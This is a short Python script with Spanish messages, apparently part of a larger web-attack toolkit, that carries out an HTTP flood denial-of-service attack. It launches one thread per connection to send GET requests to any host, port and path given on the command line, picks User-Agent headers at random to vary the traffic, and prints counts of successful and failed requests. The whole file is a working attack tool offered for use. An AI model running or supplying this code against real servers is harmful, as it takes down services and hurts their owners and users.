import sys
import http.client
import threading
import random
import os
current_dir = os.path.dirname(os.path.abspath(__file__))
project_dir = os.path.abspath(os.path.join(current_dir, "../../"))

sys.path.append(project_dir)
from WEB.Config import USER_AGENTS

def send_http_request(host, port, path, counter, active_count, inactive_count, lock):
    try:
        user_agent = random.choice(USER_AGENTS)
        headers = {"User-Agent": user_agent}
        
        connection = http.client.HTTPConnection(host, port, timeout=5)
        connection.request("GET", path, headers=headers)
        
        response = connection.getresponse()
        if response.status == 200:
            with lock:
                active_count[0] += 1
        else:
            with lock:
                inactive_count[0] += 1
        with lock:
            print(f"\rConexiones: {counter[0]} | Activas: {active_count[0]} | Inactivas: {inactive_count[0]} | Código: {response.status}", end="")
    except Exception as e:
        with lock:
            inactive_count[0] += 1
            print(f"\rConexiones: {counter[0]} | Activas: {active_count[0]} | Inactivas: {inactive_count[0]} | Código: ERROR", end="")
    finally:
        with lock:
            counter[0] += 1

def perform_dos_attack(target_host, target_port, target_path, num_connections):
    counter = [0]
    active_count = [0]
    inactive_count = [0]
    lock = threading.Lock()
    
    try:
        threads = []
        for _ in range(num_connections):
            thread = threading.Thread(target=send_http_request, args=(target_host, target_port, target_path, counter, active_count, inactive_count, lock))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("\nAtaque DoS detenido por el usuario.")

    print("\nResultados:")
    print(f"Total de conexiones: {counter[0]}")
    print(f"Conexiones activas: {active_count[0]}")
    print(f"Conexiones inactivas: {inactive_count[0]}")

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Uso: python3 script.py <host> <port> <path> <num_conexiones>")
        sys.exit(1)

    target_host = sys.argv[1]
    target_port = int(sys.argv[2])
    target_path = sys.argv[3]
    num_connections = int(sys.argv[4])

    perform_dos_attack(target_host, target_port, target_path, num_connections)
